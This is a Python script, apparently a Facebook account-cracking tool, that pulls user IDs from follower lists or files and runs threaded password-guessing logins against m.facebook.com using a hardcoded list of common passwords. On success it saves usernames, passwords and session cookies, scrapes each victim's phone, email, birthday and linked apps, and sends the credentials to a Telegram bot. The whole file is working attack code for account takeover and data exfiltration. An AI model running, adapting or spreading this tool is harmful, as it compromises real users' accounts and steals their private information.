⠀⠀⠘⣼⠉⠀⠀⠀⠈⠃⠀⠀⠀⠀⠀⠸⠀⠀⠀⠀⡼⠁⠀⠀⢀⣤⠀⠀⠀⠀⠀⠀⢇⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⠀⠀⠸⠟⠀⠀⢠⣆⠀⠀⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⢸⠀⠀⠀⠀⠀⠀⠐⠂⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⠀⠈⠉⠉⠻⠆⠀⠀⠀⠀⠀⠀⡠⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢆⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⠤⠤⡤⠤⠴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡔⠁⠀⠀
⠀⠀⠀⠀⣠⠤⠤⠤⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢩⠃⠀⠀⠀⠀⠀⡠⠒⠁⠀⠀⠀
⠀⠀⠰⠋⠀⠀⠀⠀⢀⠇⠀⠀⠀⠀⣀⡄⠀⠀⠀⠀⠀⠀⠀⠀⣀⣼⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡤⠊⠁⠀⠀⠈⠉⠀⠸⡄⠀⠀⠀⠀⣀⠔⠉⠁⡎⠈⠉⠓⠢⠤⣀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠱⠄⠀⠀⠀⠀⠀⠀⠀⡸⠀⠀⠀⢠⠇⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠈⡇⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⡤⠇⠀⠀⡠⠃⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠒⠲⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠉⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡔⠒⠉⠉⡽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠒⠢⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡔⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⠀⠉⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⠂⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠈⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

 """)



		
	
#	print(f'═══════════════════════════════════════════════════════════════')
#	print('')
#	print('\033[1;31m[\033[32;1m1\033[1;31m] \x1b[38;5;172m[𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲] - من اصدقاء')
	print(f'═══════════════════════════════════════════════════════════════')
									
																		
																																				
	print('\033[1;31m[\033[32;1m2\033[1;31m] \033[1;35m [𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲] - من ملف') 
	print(f'═══════════════════════════════════════════════════════════════')

	print('\033[1;31m[\033[32;1m0\033[1;31m] \x1b[38;5;91m [تسـجيل خروج كوكيز وحل مشكله صيد] - تسجـيل خروج') 
	print(f'═══════════════════════════════════════════════════════════════')
		
	_____alvino__adijaya_____ = input('\n[=] اختار : ')
	if _____alvino__adijaya_____ in ['1']:
		dump_massal()
	elif _____alvino__adijaya_____ in ['22']:
		follower()	
	elif _____alvino__adijaya_____ in ['2']:
		TakeFile()	
	elif _____alvino__adijaya_____ in ['0']:
		oss()
def oss():
	import os
	os.system('rm -rf .token.txt')
	os.system('rm -rf .cookie.txt')
	print('Done')
	exit()
	
	
def follower():
	
	try:
		jum = int(input('[>>] CRACK ID LIMIT : الاخيار تحت الصيانه يرجه ترسيت وختار رقم1 '))
	except ValueError:
		print('{k}[✖] NOT PUBLIC ID ')
		time.sleep(3)
		follower()
	if jum<1:
		print('[✖] Your limit error')
		time.sleep(3)
		follower()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1		
		kl = input('[*] ID >> '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			koh2 = ses.get('https://graph.facebook.com/'+userr+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
			for pi in koh2['subscribers']['data']:
				try:id.append(pi['id']+'|'+pi['name'])
				except:continue
			print('[>>] Total Id : '+str(len(id)))
			setting()
		except requests.exceptions.ConnectionError:
			print('[✖] No Connection  ')
			exit()
		except (KeyError,IOError):
			print('[✘] Id Is Not Public')
			time.sleep(3)
			follower()

def TakeFile():
	
	try:
		
		jum = input('[?] مسار الملف : ')
		for line in open(jum, 'r').readlines():
			id.append(line.strip())
		print('[•] Total Id : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
			print('[✘] No Connection  ')
			exit()
	except (KeyError,IOError):
			print('[✘] Id Is Not Public')
			time.sleep(3)
			follower()
			
def setting():
	print("\x1b[38;5;205m═━═━═━═━═━━═━═━═━═━━═━═━═━═━━═━═━═━")
	print(66*'\x1b[38;5;208m▬\x1b[38;5;205m')
	print(f'» 1- Id old | الاولويه في الفحص للحسابات القديمه')
	print(G+'▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
	print('» 2- Id New | الاولويه في الفحص للحسابات الجديده')
	print(G+'▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
	print('» 3- Old+new | قـديـمـه وجـديده ')
	print(66*'\x1b[38;5;180m▬\x1b[0;34m')

	print('')
	hu = input('» اختار : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> PILIH YANG BENAR BANG ')
		exit()
	print('>> 1. جوال ')
#    print('>> 2. Mbasic ')
#    print('>> 3. Touch  ')
#    print('>> 4. Mtouch ')
	print('')
	hc = input('» اختار : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['']:
		print('>> PILIH YANG BENAR BANG ')
		setting()
#	elif hc in ['2','02']:
#		method.append('free')
#	elif hc in ['3','03']:
#		method.append('touch')
	elif hc in ['4','04']:
		method.append('mbasic')
	else:
		method.append('mobile')
	print('')
	_jembot_ = input('>> Add App : اظهار التطبيقات المرتبطه ( Y/t ) ')
	if _jembot_ in ['']:
		print('>> Pilih Yang Bener Kontol ')
		back()
	elif _jembot_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	pwplus=input('>> Password Manual : باسورد يدوي (T عشوائي)( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
		pwku=input('>> Masukkan Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
		print('═━═━═━═━═━━═━═━═━═━━═━═━═━═━═━═')
	passwrd() 
def passwrd():
	
	
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append('19991999')
					pwv.append('19981998')
					pwv.append('19971997')
					pwv.append('19961996')
					pwv.append('19951995')
					pwv.append('19941994')
					pwv.append('19931993')
					pwv.append('19921992')
					pwv.append('19901990')
					pwv.append('19911991')
					pwv.append('zzxxccvv')
					pwv.append('mmnnbbvv')
					pwv.append('qqwweerrtt')
					pwv.append('12345qwert')
					pwv.append('aassddff')
					pwv.append('qqqqwwww')
					pwv.append('zxcvzxcv')
					pwv.append('oooopppp')
					pwv.append('qwertyuiopasdfghjkl')
					pwv.append('nnnnmmmm')
					pwv.append('firstfirst')
					pwv.append('first first')
					pwv.append('1q2w3e4r5t')
					pwv.append('first last')
					pwv.append('12345@@@@@')
					pwv.append('mmmmnnnn')
					pwv.append('1020304050')
					pwv.append('5432154321')
					pwv.append('qqwweerrttyy')
					pwv.append('10203040')
					pwv.append('zzxxcczzxxcc')
					pwv.append('1234567890')
					pwv.append('1234@@@@')
					pwv.append('20012001')
					pwv.append('1234qwer')
					pwv.append('zzzzxxxx')
					pwv.append('qwertyuiop')
					pwv.append('20232023')
					pwv.append('20222022')
					pwv.append('20212021')
					pwv.append('20202020')
					pwv.append('123456789')
					pwv.append('123456')
					pwv.append('10203040')
					pwv.append('1020304050')
					pwv.append('١٢٣٤٥٦٧٨٩٠')
					pwv.append('1234512345')
					pwv.append('123456123456')
					pwv.append('5544332211')
					pwv.append('1122334455@@')
					pwv.append('20202020')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append('00998877')
					pwv.append('112233445566')
					pwv.append('1122334455')
					pwv.append('aaaassss')
					pwv.append('07800780')
					pwv.append('11223344@@')
					pwv.append('qqwweerr')
					pwv.append('1234554321')
					pwv.append('1122334455')
					pwv.append('123456654321')
					pwv.append('20032003')
					pwv.append('ppooiiuu')
					pwv.append('07700770')
					pwv.append('0099887766')
					pwv.append('20032003')
					pwv.append('١٢٣٤٥٦')
					pwv.append('١٢٣٤٥٦٧٨٩')
					pwv.append('12345@12345')
					pwv.append('12345@')
					pwv.append('1q2w3e4r5t6y')
					pwv.append('11223344556677')
					pwv.append('20202020')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('>> Lanjut Crack Kembali ( Y/t ) ? ')
	woi = input('>> Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}[=]{k} Been completed {x} <> ')
		time.sleep(2)
		
		exit()		
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s [@k6_vk] %s/%s •_• [𝗢𝗞 ] %s •_• [𝗖𝗣] %s •_• %s%s%s' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), end=' ')
	sys.stdout.flush()
   
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\n')
					statuscp = f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 ❌
⋘─────━𓆩ارسل صور الصيد 𓆪‏━─────⋙
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
⋘─────━@DDS73 ‏━─────⋙
¹𓆩♔𓆪ȷІ⎽ɹ̤ᒧᓄ  -  @k6_vk					
					'''
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='SESI'))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
					requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statusok))
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
		
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title=' NO SESI'))
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

					infoakun += f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 ✅
⋘─────━𓆩ارسل صور الصيد 𓆪‏━─────⋙
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
⋘─────━@DDS73 ‏━─────⋙
¹𓆩♔𓆪ȷІ⎽ɹ̤ᒧᓄ  -  @k6_vk					

'''
					requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(infoakun))

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					print('\n')
					statusok = f'''					
   \n{infoakun}					
					'''
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					#requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def O():
	try:
		os.remove('ID.txt')
		os.remove('ok.coki.txt')
		os.remove('.token.txt')
		os.remove('.cok.txt')
		
	except FileNotFoundError as error:
		
		
		exit()

if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/ALVINO-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
	
	login()